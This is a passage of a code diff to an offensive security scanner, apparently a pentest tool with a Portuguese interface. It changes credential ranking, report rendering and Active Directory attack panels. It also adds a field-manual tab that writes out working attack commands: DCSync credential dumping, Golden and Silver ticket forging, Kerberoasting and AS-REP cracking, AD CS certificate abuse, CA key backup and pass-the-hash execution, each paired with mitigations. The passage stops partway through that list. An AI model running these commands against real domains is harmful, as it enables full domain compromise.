+            candidate_secret = candidate.get("password") or ""
+            candidate_method = "hash" if candidate.get("method") == "hash" else "password"
+            identity_key = (candidate_user.casefold(), candidate_secret, candidate_method)
+            if identity_key in seen_identities:
+                continue
+            seen_identities.add(identity_key)
+            unique_credentials.append(candidate)
+        for credential in unique_credentials[:ADCS_MAX_CREDENTIALS_PER_HOST]:
             username = credential.get("username") or ""
             if not username:
                 continue
@@ -6172,6 +6525,7 @@ def run_adcs_enumeration(args: argparse.Namespace, state: ScanState, logger: Log
                 command.extend(["-hashes", normalize_ntlm_hash(secret)])
             else:
                 command.extend(["-p", secret])
+            reports_before = {path.name for path in raw_dir.glob("*_Certipy.txt")}
             result = run_command(
                 command,
                 timeout=ADCS_TIMEOUT,
@@ -6182,7 +6536,14 @@ def run_adcs_enumeration(args: argparse.Namespace, state: ScanState, logger: Log
             )
             tested += 1
             report_text = ""
-            certipy_reports = sorted(raw_dir.glob("*_Certipy.txt"), key=lambda path: path.stat().st_mtime)
+            # Only a report produced by THIS attempt may be parsed: reusing the
+            # newest file in the directory would attribute a previous host or
+            # credential result to the current one.
+            new_reports = [
+                path for path in raw_dir.glob("*_Certipy.txt")
+                if path.name not in reports_before
+            ]
+            certipy_reports = sorted(new_reports, key=lambda path: path.stat().st_mtime)
             if certipy_reports:
                 report_text = read_limited_text(certipy_reports[-1], limit=4_000_000)
             combined = "\n".join(part for part in (result.stdout, result.stderr, report_text) if part)
@@ -6347,14 +6708,40 @@ def run_service_command(
     secrets: Iterable[str],
 ) -> CommandResult:
     base_timeout = {1: 60, 2: 90, 3: 120, 4: 180, 5: 240}[args.threads_level]
-    return run_command(
+    result = run_command(
         command,
         timeout=base_timeout,
         output_file=output_file,
         logger=logger,
         secrets=secrets,
-        capture_limit_bytes=BOUNDED_COMMAND_CAPTURE_BYTES,
+        capture_limit_bytes=SERVICE_CAPTURE_LIMIT_BYTES,
     )
+    if result.output_truncated:
+        logger.warn(
+            f"Saída de {command[0]} acima de {SERVICE_CAPTURE_LIMIT_BYTES // (1024 * 1024)} MB; "
+            f"parse em memória limitado (RAW completo em {result.output_file or '-'})."
+        )
+    return result
+
+
+def command_transcript(result: CommandResult) -> str:
+    """stdout+stderr for parsing, re-read from the RAW file when capture was cut."""
+    text = (result.stdout or "") + (result.stderr or "")
+    if not result.output_truncated or not result.output_file:
+        return text
+    try:
+        content = Path(result.output_file).read_text(encoding="utf-8", errors="replace")
+    except OSError:
+        return text
+    marker = "--- STDOUT ---\n"
+    if marker not in content:
+        return text
+    body = content.split(marker, 1)[1]
+    stderr_marker = "\n\n--- STDERR ---\n"
+    if stderr_marker in body:
+        stdout_part, stderr_part = body.split(stderr_marker, 1)
+        return stdout_part + stderr_part
+    return body
 
 
 def add_tool_evidence(
@@ -6858,6 +7245,7 @@ def generate_html_report(state: ScanState) -> Path:
                 table_section("Dependências", dependencies_table(state.dependencies), len(state.dependencies)),
             ]
         )
+        manual_html = attack_manual_html()
     finally:
         REPORT_RENDER_CONTEXT.reset(render_token)
 
@@ -6865,6 +7253,7 @@ def generate_html_report(state: ScanState) -> Path:
         "hosts": hosts_html,
         "service-groups": service_groups_html,
         "tables": tables_html,
+        "manual": manual_html,
     })
     command_payload = json_script_payload(render_context.commands)
     raw_payload = json_script_payload(render_context.raw_previews)
@@ -7160,9 +7549,11 @@ def generate_html_report(state: ScanState) -> Path:
     .panel {{
       border: 1px solid var(--line);
       border-radius: var(--radius);
-      background: var(--panel);
+      /* No backdrop-filter here: it creates a containing block + stacking
+         context that clipped absolute/fixed dropdown menus against the next
+         item of the list and pushed them off screen. */
+      background: rgba(23, 32, 51, 0.9);
       padding: 22px;
-      backdrop-filter: blur(12px);
       box-shadow: 0 18px 44px rgba(2, 6, 23, 0.22);
     }}
     .panel h2, .panel h3 {{ margin-top: 0; }}
@@ -7545,8 +7936,7 @@ def generate_html_report(state: ScanState) -> Path:
       white-space: nowrap;
     }}
     .command-dropdown-menu {{
-      position: absolute;
-      right: 0;
+      position: fixed;
       z-index: 9999;
       display: grid;
       gap: 5px;
@@ -7554,9 +7944,9 @@ def generate_html_report(state: ScanState) -> Path:
       min-width: min(320px, calc(100vw - 40px));
       max-width: min(520px, calc(100vw - 40px));
       max-height: min(400px, calc(100vh - 24px));
-      margin-top: 4px;
       padding: 8px;
       overflow-y: auto;
+      overscroll-behavior: contain;
       border: 1px solid var(--line-strong);
       border-radius: 6px;
       background: var(--panel-solid);
@@ -7976,6 +8366,7 @@ def generate_html_report(state: ScanState) -> Path:
       <button class="tab-button" type="button" data-tab-target="hosts">Por Host</button>
       <button class="tab-button" type="button" data-tab-target="service-groups">Por Serviço</button>
       <button class="tab-button" type="button" data-tab-target="tables">Tabelas</button>
+      <button class="tab-button" type="button" data-tab-target="manual">Manual de Campo</button>
     </nav>
 
     <section id="tab-overview" class="tab-panel active" data-hydrated="true">
@@ -7987,6 +8378,8 @@ def generate_html_report(state: ScanState) -> Path:
     <section id="tab-service-groups" class="tab-panel" data-hydrated="false"><div class="tab-loading">Conteúdo carregado ao abrir a aba.</div></section>
 
     <section id="tab-tables" class="tab-panel" data-hydrated="false"><div class="tab-loading">Conteúdo carregado ao abrir a aba.</div></section>
+
+    <section id="tab-manual" class="tab-panel" data-hydrated="false"><div class="tab-loading">Conteúdo carregado ao abrir a aba.</div></section>
   </main>
   <script id="tab-payload" type="application/json">{tab_payload}</script>
   <script id="command-payload" type="application/json">{command_payload}</script>
@@ -8248,6 +8641,37 @@ def generate_html_report(state: ScanState) -> Path:
       event.preventDefault();
       sortTableByHeader(header);
     }});
+    function positionCommandMenu(details) {{
+      const summary = details.querySelector(':scope > summary');
+      const menu = details.querySelector(':scope > .command-dropdown-menu');
+      if (!summary || !menu) return;
+      const margin = 8;
+      const gap = 4;
+      menu.style.position = 'fixed';
+      menu.style.left = margin + 'px';
+      menu.style.top = margin + 'px';
+      menu.style.maxHeight = 'none';
+      const summaryRect = summary.getBoundingClientRect();
+      const natural = menu.getBoundingClientRect();
+      const maxWidth = Math.max(220, window.innerWidth - margin * 2);
+      const width = Math.min(natural.width || 320, maxWidth);
+      const spaceBelow = window.innerHeight - summaryRect.bottom - gap - margin;
+      const spaceAbove = summaryRect.top - gap - margin;
+      const naturalHeight = natural.height || 200;
+      const placeBelow = spaceBelow >= Math.min(naturalHeight, 240) || spaceBelow >= spaceAbove;
+      const available = Math.max(160, placeBelow ? spaceBelow : spaceAbove);
+      const height = Math.min(naturalHeight, available);
+      let left = summaryRect.left;
+      if (left + width > window.innerWidth - margin) left = window.innerWidth - margin - width;
+      left = Math.max(margin, left);
+      let top = placeBelow ? summaryRect.bottom + gap : summaryRect.top - gap - height;
+      top = Math.max(margin, top);
+      menu.style.left = left + 'px';
+      menu.style.top = top + 'px';
+      menu.style.width = width + 'px';
+      menu.style.maxHeight = height + 'px';
+    }}
+
     document.addEventListener('toggle', event => {{
       const details = event.target;
       if (!(details instanceof HTMLDetailsElement)) return;
@@ -8256,6 +8680,7 @@ def generate_html_report(state: ScanState) -> Path:
           document.querySelectorAll('details.command-dropdown[open]').forEach(other => {{
             if (other !== details) other.removeAttribute('open');
           }});
+          positionCommandMenu(details);
         }}
         return;
       }}
@@ -8271,6 +8696,16 @@ def generate_html_report(state: ScanState) -> Path:
         if (placeholder.dataset.rawStyle) area.style.cssText = placeholder.dataset.rawStyle;
         placeholder.replaceWith(area);
       }});
+    }}, true);
+    // The command menu is fixed-positioned and clamped to the viewport.  Close it
+    // when the page layout moves so it can never drift over another row.
+    window.addEventListener('resize', () => {{
+      document.querySelectorAll('details.command-dropdown[open]').forEach(details => details.removeAttribute('open'));
+    }});
+    document.addEventListener('scroll', event => {{
+      const insideMenu = event.target instanceof Element && event.target.closest('.command-dropdown-menu');
+      if (insideMenu) return;
+      document.querySelectorAll('details.command-dropdown[open]').forEach(details => details.removeAttribute('open'));
     }}, true);
     document.addEventListener('click', event => {{
       const details = event.target.closest('details.inline-web-list');
@@ -8803,7 +9238,7 @@ def service_group_dashboard(
         rows.append(
             f'<details class="group-item" data-filter="{filter_text}" data-service="{h(group_name)}">'
             "<summary>"
-            f'<span class="summary-title"><strong>{h(group_name)}</strong></span>'
+            f'<span class="summary-title"><strong>{h(service_group_title(group_name))}</strong></span>'
             '<span class="summary-pills">'
             f'{metric_pill("hosts", len(hosts))}'
             f'{metric_pill("serviços", len(display_services))}'
@@ -8835,16 +9270,26 @@ def service_group_body(
         return (
             smb_service_group_table(services, endpoints_by_host_port, state)
             + smb_structured_summary_html(services, state)
-            + ad_attack_panel(services, state)
         )
     if group_name == "KERBEROS":
-        # Kerberoasting/AS-REP output lives with the KERBEROS session (it was
-        # previously rendered in the overview tab).
+        # Every AD-specific workflow lives here: Kerberoasting/AS-REP output,
+        # Golden/Silver tickets and AD CS (they were split across SMB before).
         return (
             kerberos_service_group_table(services, endpoints_by_host_port, state)
             + kerberos_attacks_summary_html(state)
+            + ad_attack_panel(services, state)
         )
     return service_group_table(services, endpoints_by_host_port, state)
+
+
+SERVICE_GROUP_TITLES = {
+    "KERBEROS": "KERBEROS / AD — tickets, roasting e AD CS",
+}
+
+
+def service_group_title(group_name: str) -> str:
+    """Display title for a session while the group key stays stable for filters."""
+    return SERVICE_GROUP_TITLES.get(group_name, group_name)
 
 
 def service_group_actions(group_name: str, services: list[ServiceRecord], state: ScanState) -> str:
@@ -8854,7 +9299,7 @@ def service_group_actions(group_name: str, services: list[ServiceRecord], state:
     command_buttons = service_group_command_buttons(services, state)
     return (
         '<div class="service-group-actions">'
-        f'<span class="muted">{h(group_name)}: {h(len(targets))} alvo(s) ativo(s)</span>'
+        f'<span class="muted">{h(service_group_title(group_name))}: {h(len(targets))} alvo(s) ativo(s)</span>'
         f'<div class="copy-actions">{copy_commands_button("Copiar IP:porta", targets)}{copy_commands_button("Copiar IPs", service_group_ips(services))}{command_buttons}</div>'
         "</div>"
     )
@@ -9501,7 +9946,7 @@ def smb_service_group_table(
     ad_status_by_host: dict[str, dict[str, Any]] = {}
     adcs_status_by_host: dict[str, dict[str, Any]] = {}
     for grouped_ip in {service.ip for service in services}:
-        if not is_ad_host(state, grouped_ip):
+        if not is_ad_dc(state, grouped_ip):
             continue
         ad_status_by_host[grouped_ip] = ad_attack_context(state, grouped_ip)
         adcs_status_by_host[grouped_ip] = adcs_status_for_host(state, grouped_ip)
@@ -9894,7 +10339,7 @@ def detect_auth_credentials_from_evidence(state: ScanState) -> dict[tuple[str, i
             stored_method = "hash" if ntlm_hash and not clear_password else str(item.data.get("auth_method", "") or "")
             method = normalize_auth_method(stored_method, username=username)
             domain = str(item.data.get("domain", "") or "")
-            auth_scope = str(item.data.get("auth_scope", "") or "")
+            auth_scope = str(item.data.get("auth_scope") or "") or ("domain" if str(item.data.get("domain") or "").strip() else "service-default")
             if item.data.get("password_only"):
                 username = ""
                 domain = ""
@@ -10925,9 +11370,18 @@ def command_block_html(title: str, commands: list[str], *, open_by_default: bool
 
 
 def command_dom_id(command: str) -> str:
-    seed = f"{uuid.uuid4().hex}:{command}"
-    digest = hashlib.sha1(seed.encode("utf-8", errors="ignore")).hexdigest()[:16]
-    return f"cmd-{digest}"
+    """Deterministic, collision-free DOM id for one rendered command block.
+
+    A random seed made two renders of the same run differ byte by byte, which
+    breaks diffing/archiving the report.  The id is now derived from the command
+    plus a per-render sequence, so identical commands still get distinct ids.
+    """
+    digest = hashlib.sha1((command or "").encode("utf-8", errors="ignore")).hexdigest()[:12]
+    context = REPORT_RENDER_CONTEXT.get()
+    if context is None:
+        return f"cmd-{digest}"
+    context.command_id_seq += 1
+    return f"cmd-{digest}-{context.command_id_seq}"
 
 
 def command_tool_name(command: str) -> str:
@@ -11264,6 +11718,16 @@ def is_ad_host(state: ScanState, ip: str) -> bool:
     return bool(ad_domain_for_host(state, ip))
 
 
+def is_ad_dc(state: ScanState, ip: str) -> bool:
+    """True only for hosts that are themselves domain controllers.
+
+    Golden/Silver ticket and AD CS workflows act on the DC (krbtgt, SID and the
+    CA live there), so they are offered only for detected DCs (Kerberos + LDAP).
+    Domain-joined member servers keep the normal SMB tooling.
+    """
+    return ip in detect_dc_ips(state)
+
+
 def ad_credentials_for_host(state: ScanState, ip: str) -> list[dict[str, str]]:
     """Accepted, non-anonymous credentials usable for AD attacks on a host."""
     result: list[dict[str, str]] = []
@@ -11292,6 +11756,68 @@ def ad_credentials_for_host(state: ScanState, ip: str) -> list[dict[str, str]]:
             seen.add(key)
             result.append(credential)
     return result
+
+
+AD_CREDENTIAL_KIND_LABELS = {
+    "validated": "credencial validada pelo AD CS",
+    "domain": "credencial de domínio validada",
+    "domain-other": "credencial de outro domínio (validar antes de usar)",
+    "service-default": "credencial validada no contexto padrão",
+    "local": "somente credencial LOCAL (não serve para domínio)",
+    "none": "sem credencial validada",
+}
+
+
+def ad_credential_rank(
+    state: ScanState,
+    ip: str,
+    credential: dict[str, str],
+    *,
+    preferred_id: str = "",
+) -> int:
+    """0 = validada pelo AD CS, 1 = domínio do alvo, 2 = outro domínio,
+    3 = contexto padrão, 4 = credencial apenas local (não serve para domínio)."""
+    if preferred_id and credential_fingerprint(credential) == preferred_id:
+        return 0
+    realm_key = ad_domain_for_host(state, ip).casefold()
+    domain = str(credential.get("domain") or "").strip()
+    scope = str(credential.get("auth_scope") or "").strip().casefold()
+    if domain and (not realm_key or domain.casefold() == realm_key):
+        return 1
+    if domain:
+        return 2
+    if scope == "local":
+        return 4
+    return 3
+
+
+def ad_primary_credential(
+    state: ScanState,
+    ip: str,
+    *,
+    preferred_id: str = "",
+) -> tuple[dict[str, str] | None, str]:
+    """Pick the credential used by Golden/Silver ticket and AD CS commands.
+
+    A local-SAM credential validates the *machine* account, not the directory:
+    using it in ``certipy``/``ticketer``/``secretsdump`` produces commands that
+    always fail against the DC.  The picker therefore prefers, in order:
+    the identity certipy already validated, a validated credential for this
+    realm, a credential for another domain, a service-default authentication,
+    and never a local-only one.
+    """
+    candidates = ad_credentials_for_host(state, ip)
+    if not candidates:
+        return None, "none"
+
+    def rank(credential: dict[str, str]) -> int:
+        return ad_credential_rank(state, ip, credential, preferred_id=preferred_id)
+
+    best = min(candidates, key=rank)
+    best_rank = rank(best)
+    if best_rank == 4:
+        return None, "local"
+    return best, {0: "validated", 1: "domain", 2: "domain-other"}.get(best_rank, "service-default")
 
 
 def _ad_evidence_texts(state: ScanState, ip: str) -> Iterable[str]:
@@ -11551,14 +12077,13 @@ def adcs_commands(service: ServiceRecord, state: ScanState) -> dict[str, list[tu
     domain_slug = domain.lower()
     dc_ip = ctx["dc_ip"] or ip
     status = adcs_status_for_host(state, ip)
-    credentials = ad_credentials_for_host(state, ip)
-    if status.get("credential_id"):
-        credentials = sorted(
-            credentials,
-            key=lambda cred: 0 if credential_fingerprint(cred) == status["credential_id"] else 1,
-        )
-    credential = credentials[0] if credentials else None
-    username = status.get("user") or (credential.get("username") if credential else "") or "USUARIO"
+    credential, credential_kind = ad_primary_credential(
+        state, ip, preferred_id=str(status.get("credential_id") or "")
+    )
+    if credential is not None:
+        username = str(credential.get("username") or "") or str(status.get("user") or "") or "USUARIO"
+    else:
+        username = "USUARIO"
     ca = (status.get("cas") or [ADCS_DEFAULT_CA])[0]
     template = (status.get("templates") or [ADCS_DEFAULT_TEMPLATE])[0]
     auth = _ad_auth_flags(credential)
@@ -11568,15 +12093,59 @@ def adcs_commands(service: ServiceRecord, state: ScanState) -> dict[str, list[tu
     # (administrator's NT hash), not from the krbtgt account.
     nt_hash = ctx.get("administrator_hash") or "HASH_NT_OBTIDO"
     find_cmd = f"certipy-ad find -u {sq(f'{domain_slug}/{username}')} {auth} -dc-ip {dc_ip} -vulnerable"
-    template_auth = f"-u {sq(username)} {auth} -d {sq(domain_slug)} -dc-ip {dc_ip}"
+    # The domain goes inside -u ("DOMAIN/user"): Certipy v5 dropped the -d flag,
+    # and v4 accepts the same combined form.
+    template_auth = f"-u {sq(f'{domain_slug}/{username}')} {auth} -dc-ip {dc_ip}"
+    version_text = str(state.metadata.get("certipy_version") or "")
+    major_match = re.match(r"(\d+)", version_text)
+    certipy_major = int(major_match.group(1)) if major_match else 5
+    legacy_certipy = certipy_major < 5
+    legacy_save = f"certipy-ad template {template_auth} -template {sq(template)} -save-old"
+    modern_save = (
+        f"certipy-ad template {template_auth} -template {sq(template)} "
+        f"-save-configuration {sq(template + '.old.json')}"
+    )
+    legacy_restore = (
+        f"certipy-ad template {template_auth} -template {sq(template)} "
+        f"-configuration {sq(template + '.json')}"
+    )
+    modern_restore = (
+        f"certipy-ad template {template_auth} -template {sq(template)} "
+        f"-write-configuration {sq(template + '.old.json')}"
+    )
+    detected_major = certipy_major
+    save_primary, save_alternative = (legacy_save, modern_save) if legacy_certipy else (modern_save, legacy_save)
+    restore_primary, restore_alternative = (
+        (legacy_restore, modern_restore) if legacy_certipy else (modern_restore, legacy_restore)
+    )
+    save_primary_label = (
+        f"2. Salvar template original (Certipy v{detected_major}: -save-old)"
+        if legacy_certipy
+        else f"2. Salvar template original (Certipy v{detected_major}: -save-configuration)"
+    )
+    save_alternative_label = (
+        "2b. Alternativa para Certipy v5 (-save-configuration)" if legacy_certipy
+        else "2b. Alternativa para Certipy v4 (-save-old)"
+    )
+    restore_primary_label = (
+        f"5. Restaurar template original (Certipy v{detected_major}: -configuration)"
+        if legacy_certipy
+        else f"5. Restaurar template original (Certipy v{detected_major}: -write-configuration)"
+    )
+    restore_alternative_label = (
+        "5b. Alternativa para Certipy v5 (-write-configuration)" if legacy_certipy
+        else "5b. Alternativa para Certipy v4 (-configuration)"
+    )
     commands: dict[str, list[tuple[str, str]]] = {
         "AD CS (Certipy)": [
             ("1. [EXECUTADO] Validar usuário e achar templates vulneráveis", find_cmd),
             ("1b. Enumerar somente templates habilitados", f"{find_cmd} -enabled -stdout"),
-            ("2. Salvar template original (DomainControllerAuthentication)", f"certipy-ad template {template_auth} -template {sq(template)} -save-old"),
+            (save_primary_label, save_primary),
+            (save_alternative_label, save_alternative),
             ("3. Solicitar certificado para administrator", f"certipy-ad req {template_auth} -ca {sq(ca)} -template {sq(template)} -upn {sq(upn)}"),
             ("4. Autenticar com o PFX (obter TGT/hash)", f"certipy-ad auth -pfx {sq(pfx)} -dc-ip {dc_ip}"),
-            ("5. Restaurar template original", f"certipy-ad template {template_auth} -template {sq(template)} -configuration {sq(template + '.json')}"),
+            (restore_primary_label, restore_primary),
+            (restore_alternative_label, restore_alternative),
             ("6. WMIExec com o hash NTLM obtido", f"impacket-wmiexec -hashes {sq(':' + nt_hash)} {sq('administrator@' + dc_ip)}"),
             ("Extra — ESC1 com UPN arbitrário", f"certipy-ad req {template_auth} -ca {sq(ca)} -template {sq(template)} -upn {sq('administrator@' + domain_slug)} -dcom"),
             ("Extra — Backup da CA (dump de chave privada)", f"certipy-ad ca {template_auth} -ca {sq(ca)} -backup"),
@@ -11602,9 +12171,14 @@ def ticket_attack_commands(service: ServiceRecord, state: ScanState) -> dict[str
     krbtgt = ctx["krbtgt"] or "KRBTGT_NTHASH"
     machine_account = ctx["machine_account"] or "MAQUINA$"
     machine_hash = ctx["machine_hash"] or "SERVICE_NTHASH"
-    credentials = ad_credentials_for_host(state, ip)
-    credential = credentials[0] if credentials else None
-    username = credential.get("username") if credential else "USUARIO"
+    ticket_status = adcs_status_for_host(state, ip)
+    credential, credential_kind = ad_primary_credential(
+        state, ip, preferred_id=str(ticket_status.get("credential_id") or "")
+    )
+    if credential is not None:
+        username = str(credential.get("username") or "") or "USUARIO"
+    else:
+        username = "USUARIO"
     principal = f"{domain_slug}/{username}"
     if credential and credential.get("method") == "hash":
         dump_target = f"-hashes {sq(normalize_ntlm_hash(credential.get('password', '')))} {sq(principal + '@' + dc_ip)}"
@@ -11669,9 +12243,9 @@ def ticket_attack_commands(service: ServiceRecord, state: ScanState) -> dict[str
 
 
 def ad_attack_panel(services: list[ServiceRecord], state: ScanState) -> str:
-    """SMB session panel with Golden/Silver ticket and AD CS status per AD host."""
+    """KERBEROS/AD session panel: Golden/Silver ticket and AD CS status per DC."""
     ad_hosts = sorted(
-        {service.ip for service in services if is_ad_host(state, service.ip)},
+        {service.ip for service in services if is_ad_dc(state, service.ip)},
         key=ip_sort_key,
     )
     if not ad_hosts:
@@ -11680,7 +12254,9 @@ def ad_attack_panel(services: list[ServiceRecord], state: ScanState) -> str:
     for ip in ad_hosts:
         ctx = ad_attack_context(state, ip)
         status = adcs_status_for_host(state, ip)
-        credentials = ad_credentials_for_host(state, ip)
+        chosen_credential, credential_kind = ad_primary_credential(
+            state, ip, preferred_id=str(status.get("credential_id") or "")
+        )
         host = state.hosts.get(ip, HostRecord(ip=ip))
         hostname = host.hostname or host.fqdn or "-"
         sid_badge = (
@@ -11698,11 +12274,22 @@ def ad_attack_panel(services: list[ServiceRecord], state: ScanState) -> str:
             "denied": '<span class="pill sev-low">AD CS: usuário não validado</span>',
             "unknown": '<span class="pill">AD CS: não testado</span>',
         }[status.get("state", "unknown")]
-        cred_badge = (
-            f'<span class="pill sev-medium">credencial aceita: {h(credentials[0].get("label", ""))}</span>'
-            if credentials
-            else '<span class="pill">sem credencial aceita</span>'
-        )
+        kind_label = AD_CREDENTIAL_KIND_LABELS.get(credential_kind, credential_kind)
+        if chosen_credential is not None:
+            cred_badge = (
+                f'<span class="pill sev-medium">usando credencial validada: '
+                f'{h(chosen_credential.get("label", ""))} · {h(kind_label)}</span>'
+            )
+        elif credential_kind == "local":
+            cred_badge = (
+                '<span class="pill sev-high">somente credencial LOCAL validada — '
+                'comandos de domínio usam placeholders</span>'
+            )
+        else:
+            cred_badge = (
+                '<span class="pill sev-low">sem credencial de domínio validada — '
+                'comandos usam placeholders</span>'
+            )
         ticket_buttons = "".join(
             command_dropdown_button(tool, cmds) for tool, cmds in ticket_attack_commands(
                 ServiceRecord(ip=ip, port=445, protocol="tcp", service="microsoft-ds"), state
@@ -11744,7 +12331,7 @@ def ad_attack_panel(services: list[ServiceRecord], state: ScanState) -> str:
     return (
         '<div class="panel">'
         "<h2>AD — Golden / Silver Ticket e AD CS</h2>"
-        '<div class="muted">Sessão SMB limitada aos hosts identificados como Active Directory. '
+        '<div class="muted">Somente Domain Controllers detectados (Kerberos + LDAP). '
         "SID e KRBTGT são preenchidos automaticamente quando já foram capturados neste run.</div>"
         + "".join(cards)
         + "</div>"
@@ -11784,6 +12371,292 @@ def host_copy_actions(hosts: list[HostRecord], services: list[ServiceRecord]) ->
         f'<div class="copy-actions" style="margin-top:8px">{"".join(buttons)}</div>'
         "</div>"
     )
+
+
+def manual_command_row(label: str, command: str, explanation: str) -> str:
+    """One copyable example command with a plain-language explanation."""
+    return (
+        '<div style="margin:10px 0 12px 0">'
+        '<div class="copy-actions" style="align-items:center;gap:8px;margin-bottom:4px">'
+        f'{copy_text_button("Copiar comando", command)}<span class="pill">{h(label)}</span>'
+        "</div>"
+        f'<div class="mono" style="white-space:pre-wrap;word-break:break-all;font-size:12px">{h(command)}</div>'
+        f'<div class="muted" style="margin-top:3px">{h(explanation)}</div>'
+        "</div>"
+    )
+
+
+def manual_attack_section(
+    title: str,
+    impact: str,
+    analogy: str,
+    how: str,
+    commands: Iterable[tuple[str, str, str]],
+    where: str,
+    mitigation: str,
+) -> str:
+    rows = "".join(
+        manual_command_row(label, command, explanation) for label, command, explanation in commands
+    )
+    return (
+        '<details class="group-item">'
+        "<summary>"
+        f'<span class="summary-title"><strong>{h(title)}</strong></span>'
+        f'<span class="summary-pills">{metric_pill("impacto", impact)}</span>'
+        "</summary>"
+        '<div class="group-body">'
+        f'<div style="margin-bottom:8px"><strong>Analogia:</strong> <span class="muted">{h(analogy)}</span></div>'
+        f'<div style="margin-bottom:10px"><strong>Como funciona:</strong> <span class="muted">{h(how)}</span></div>'
+        f"{rows}"
+        f'<div class="kv" style="margin-top:6px"><span>No Bird Scan</span><div class="muted">{h(where)}</div></div>'
+        f'<div class="kv"><span>Mitigação</span><div class="muted">{h(mitigation)}</div></div>'
+        "</div>"
+        "</details>"
+    )
+
+
+def attack_manual_html() -> str:
+    """Didactic "field manual": what each attack does, with real commands.
+
+    Static content on purpose: it is a reference for the operator, so it does not
+    depend on the scan.  Placeholders match the ones used in the copy actions
+    (DOM, DC_IP, USER, PASS, NTHASH, SID, CA, TEMPLATE, ATTACKER_IP).
+    """
+    sections = [
+        manual_attack_section(
+            "Golden Ticket (krbtgt)",
+            "crítico",
+            "É como forjar o crachá-mestre do prédio: o porteiro confere a assinatura do síndico (krbtgt) e libera qualquer porta, sem consultar a lista de visitantes.",
+            "O domínio assina os tickets Kerberos com a chave da conta krbtgt. Com o hash dessa conta você emite um TGT falso, válido para qualquer serviço e qualquer usuário, sem precisar de senha e sem tocar no DC.",
+            [
+                ("Capturar o krbtgt", "impacket-secretsdump -just-dc 'DOM/USER:PASS@DC_IP'",
+                 "Faz DCSync e despeja as contas do domínio; a linha do krbtgt traz o hash NT que assina os TGTs."),
+                ("Forjar o ticket", "impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid SID -domain DOM -user-id 500 -extra-pac administrator",
+                 "-nthash é a chave do krbtgt, -domain-sid identifica o domínio, -user-id 500 é o RID do Administrator e -extra-pac inclui os grupos no PAC."),
+                ("Usar o ticket", "export KRB5CCNAME=administrator.ccache && impacket-wmiexec -k -no-pass DC_IP",
+                 "O cache Kerberos substitui a senha: qualquer ferramenta com -k -no-pass autentica com o ticket forjado."),
+            ],
+            "Sessão SMB dos DCs → botões Golden Ticket, com SID e KRBTGT preenchidos quando já capturados.",
+            "Rotacionar o krbtgt duas vezes, proteger o DCSync (replicação restrita) e monitorar TGTs com vida longa ou PAC inconsistente.",
+        ),
+        manual_attack_section(
+            "Silver Ticket (conta de serviço)",
+            "alto",
+            "Em vez de falsificar o crachá-mestre, você falsifica o crachá de um setor específico: só abre a porta daquele serviço, mas ninguém confere no sistema central.",
+            "O serviço valida o ticket com a chave da própria conta (máquina ou serviço). Com o hash dessa conta você gera um TGS para o SPN desejado e acessa aquele serviço sem passar pelo DC.",
+            [
+                ("Obter o hash", "impacket-secretsdump -just-dc-user 'DC01$' 'DOM/USER:PASS@DC_IP'",
+                 "Despeja só a conta de máquina do DC (-just-dc-user) para usar como chave do serviço cifs."),
+                ("Forjar o ticket", "impacket-ticketer -nthash SERVICE_NTHASH -domain-sid SID -domain DOM -spn cifs/DC01.DOM -user-id 500 -extra-pac administrator",
+                 "-spn escolhe o serviço (cifs, host, http, ldap, wsman); o hash precisa ser o da conta dona do SPN."),
+                ("Usar o ticket", "impacket-smbclient -k -no-pass 'administrator@DC_IP'",
+                 "Abre o SMB com o TGS forjado; não há contato com o KDC, então revogar senha não invalida o ticket."),
+            ],
+            "Sessão SMB dos DCs → botões Silver Ticket (variantes cifs/host/http/ldap/wsman).",
+            "Usar contas de serviço gMSA com rotação automática, restringir SPNs privilegiados e auditar logons 4624 tipo 3 sem TGT correspondente.",
+        ),
+        manual_attack_section(
+            "Kerberoasting",
+            "alto",
+            "É pedir ao garçom o cardápio e levar o prato para casa: o serviço entrega um ticket criptografado com a senha da conta de serviço, e você quebra a senha offline.",
+            "Qualquer usuário de domínio pode pedir um TGS para um SPN. O ticket vem cifrado com a chave da conta de serviço; com o hash em mãos, o ataque é offline (hashcat), sem gerar logons.",
+            [
+                ("Listar e pedir tickets", "impacket-GetUserSPNs -request -dc-ip DC_IP 'DOM/USER:PASS' -outputfile kerberoast.txt",
+                 "-request baixa os TGS de todas as contas com SPN; -outputfile grava no formato hashcat."),
+                ("Quebrar offline", "hashcat -m 13100 kerberoast.txt wordlist.txt",
+                 "Modo 13100 é Kerberos TGS-REP; a senha da conta de serviço cai por dicionário ou regra."),
+            ],
+            "Sessão KERBEROS → coluna HASH (hash + comando hashcat prontos) e dropdown Kerberoasting.",
+            "Senhas longas (25+ caracteres) em contas de serviço, gMSA e alerta para muitos 4769 com RC4.",
+        ),
+        manual_attack_section(
+            "AS-REP Roasting",
+            "alto",
+            "É um cartão de visitas que já vem com a senha escrita atrás: a conta não exige pré-autenticação, então o DC entrega material cifrado para qualquer um pedir.",
+            "Contas com 'Do not require Kerberos preauthentication' devolvem um AS-REP cifrado com a senha do usuário, sem precisar de credencial válida. O crack é offline.",
+            [
+                ("Pedir os hashes", "impacket-GetNPUsers -no-pass -usersfile users.txt -request -format hashcat -dc-ip DC_IP DOM/",
+                 "-usersfile lista os usuários a testar; -no-pass dispensa credencial; -format hashcat já deixa pronto para o crack."),
+                ("Quebrar offline", "hashcat -m 18200 asrep.txt wordlist.txt",
+                 "Modo 18200 é Kerberos AS-REP; contas com senha fraca caem rápido."),
+            ],
+            "Sessão KERBEROS → coluna HASH (tipo AS-REP) e dropdown AS-REP Roasting.",
+            "Exigir pré-autenticação em todas as contas e senhas fortes; monitorar 4768 com pré-autenticação ausente.",
+        ),
+        manual_attack_section(
+            "AD CS — abuso de certificados (ESC1/ESC8)",
+            "crítico",
+            "É o setor de emissão de crachás com um formulário que aceita qualquer nome: você pede um crachá de administrador e o balcão emite.",
+            "O AD CS emite certificados que valem como autenticação Kerberos. Templates mal configurados (ESC1: o solicitante escolhe o titular; ESC8: relay NTLM para o endpoint HTTP) permitem obter um certificado de outra identidade e trocá-lo por um TGT.",
+            [
+                ("Enumerar (o scanner executa só este)", "certipy-ad find -u 'DOM/USER' -p 'PASS' -dc-ip DC_IP -vulnerable",
+                 "-vulnerable mostra só templates exploráveis; a saída lista CAs e os códigos ESC encontrados. O domínio vai dentro do -u (DOM/USER): o Certipy v5 removeu o -d."),
+                ("Salvar o template original (v5)", "certipy-ad template -u 'DOM/USER' -p 'PASS' -dc-ip DC_IP -template TEMPLATE -save-configuration TEMPLATE.old.json",
